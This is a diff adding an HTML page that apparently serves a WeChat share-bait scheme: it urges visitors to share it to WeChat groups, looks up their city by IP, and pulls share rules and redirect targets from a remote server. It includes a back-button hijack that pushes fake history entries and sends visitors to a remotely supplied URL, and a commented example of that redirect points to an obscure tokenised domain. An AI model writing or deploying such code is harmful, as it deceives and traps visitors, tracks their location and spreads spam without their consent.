@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <title>.</title>
+    <link rel="stylesheet" href="https://media-video-08.oss-cn-shanghai.aliyuncs.com/v6/static/public/css/index.css" />
+</head>
+<body class="secondpage">
+<div id="dierPage" class="xian_ceng">
+    <div class="beij_pic">
+        <img id="bjImgshow" src="https://media-video-08.oss-cn-shanghai.aliyuncs.com/v6/static/upload/share_bg/1565753959.png">
+    </div>
+    <div id="tips" class="tips">
+        <img src="https://media-video-08.oss-cn-shanghai.aliyuncs.com/v6/static/public/img/tips.png" />
+        请分享到有效微信群
+    </div>
+</div>
+<script>
+    var _hmt = _hmt || [];
+</script>
+
+<script>
+    window.goal_data = JSON.parse('{"dir":"\/xx4-216","type":2}'); //https://media-video-08.oss-cn-shanghai.aliyuncs.com/v6
+    function back(backUrl) {
+        if (!backUrl) {
+            return false;
+        }
+        var fn = arguments.callee;
+        if (fn.hasInit) {
+            return false;
+        }
+        fn.hasInit = true;
+        setTimeout(function() {
+            history.pushState(
+                history.length + 1,
+                'back',
+                location.href + '#' + new Date().getTime()
+            );
+        }, 100);
+        window.onhashchange = function() {
+            location.href = backUrl;
+        };
+    }
+
+    /* 返回监听 */
+    //back('http://lb9ev5mk92.thfdh.yfxtyy.cn/48e479e07668040555ad1893315d81180a1cbe66ccad7e8d95fc4655c18647df7d3942a2059c8df671315b5af7f1dfa5c5c1e8f2c62e78457cc97033bd27d9607a9da0d5af73e103e3e254ed097e50?xx4ad&');
+</script>
+<script type="text/javascript" src="https://ip.ws.126.net/ipquery"></script>
+<script type="text/javascript" src="https://res.wx.qq.com/open/js/jweixin-1.2.0.js"></script>
+<script src="https://media-video-08.oss-cn-shanghai.aliyuncs.com/v6/static/public/js/common.js"></script>
+<script src="https://media-video-08.oss-cn-shanghai.aliyuncs.com/v6/static/public/js/zepto.min.js"></script>
+<script src="https://media-video-08.oss-cn-shanghai.aliyuncs.com/v6/static/public/js/pptv.js"></script>
+
+<script type="text/javascript">
+    $.get('https://b.api.de33p.cn/v6/remote'+location.search,function(json){
+        if(json.hm!=''){
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?"+json.hm;
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        }
+        window.sdk_config=json.config;
+        window.goal1_url=json.url;
+        window.share_rule=json.dacta;
+        if(json.back){
+            back(json.back)
+        }
+        callback(sdk_config,share_rule);
+    },'json');
+    var dizhi = '';
+    if(typeof localAddress != 'undefined') {
+        if(typeof localAddress["city"] != 'undefined' && localAddress["city"] != ''){
+            dizhi = localAddress["city"];
+            dizhi = dizhi.replace("市", "");
+        }else if(typeof localAddress["province"] != 'undefined' && localAddress["province"] != ''){
+            dizhi = localAddress["province"];
+            dizhi = dizhi.replace("省", "");
+        }
+    }
+</script>
+
+</body>
+</html>
